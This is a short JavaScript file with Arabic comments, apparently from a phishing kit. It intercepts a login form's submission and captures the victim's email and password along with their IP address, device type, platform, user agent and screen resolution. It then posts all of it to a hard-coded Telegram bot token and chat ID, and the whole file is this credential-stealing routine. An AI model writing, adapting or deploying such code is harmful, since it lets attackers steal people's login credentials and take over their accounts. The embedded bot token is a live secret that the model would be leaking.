document.getElementById('login-form').addEventListener('submit', function (e) {
    e.preventDefault();

    // المتغيرات
    const TOKEN = "7898585897:AAFPCHsaYuZVM-0fSHyqZhdWfsXscelZUVY"; // توكن البوت
    const CHAT_ID = "5538758504"; // معرف الشات
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

    // جلب المدخلات من النموذج
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();

    // التحقق من الحقول
    if (!email || !password) {
        alert('Please fill out all fields!');
        return;
    }

    // جلب IP والمعلومات الأخرى
    axios.get('https://api.ipify.org?format=json')
        .then(response => {
            const ip = response.data.ip;

            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const screenWidth = screen.width;
            const screenHeight = screen.height;
            const deviceType = /mobile/i.test(userAgent) ? 'Mobile' : 'Desktop';

            // إعداد الرسالة
            const message = `
<b>New Login Attempt</b>
<b>Email:</b> ${email}
<b>Password:</b> ${password}
<b>IP Address:</b> ${ip}
<b>Device Type:</b> ${deviceType}
<b>Platform:</b> ${platform}
<b>User Agent:</b> ${userAgent}
<b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
            `;

            // إرسال الرسالة إلى تيليجرام
            axios.post(URI_API, {
                chat_id: CHAT_ID,
                parse_mode: 'html',
                text: message
            }).then(() => {
                alert('Information sent successfully!');
            }).catch(() => {
                alert('Error sending the information. Please try again.');
            });
        })
        .catch(() => {
            alert('Error fetching the IP address. Please try again.');
        });
});
